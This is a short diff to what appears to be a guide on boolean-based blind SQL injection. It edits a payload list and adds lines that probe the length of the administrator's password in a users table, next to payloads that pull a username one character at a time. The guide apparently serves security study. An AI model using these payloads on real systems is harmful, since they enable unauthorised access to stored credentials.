@@ -105,7 +105,8 @@ This technique checks if a condition is true or false by observing different app
 **Payloads:** 
 ```sql  
 ' AND 1=1--  
-' AND (SELECT LENGTH(username) FROM users WHERE username = 'administrator') = 14--  
+' or (SELECT LENGTH(password) FROM users WHERE username = 'administrator') = 32--
+' or (select length((select password from users where username = 'administrator'))) = 32-- 
 ' AND SUBSTRING((SELECT username FROM users WHERE username = 'administrator'), 1, 1) = 'a'--  
 
 '||(SELECT 'hello')||'  
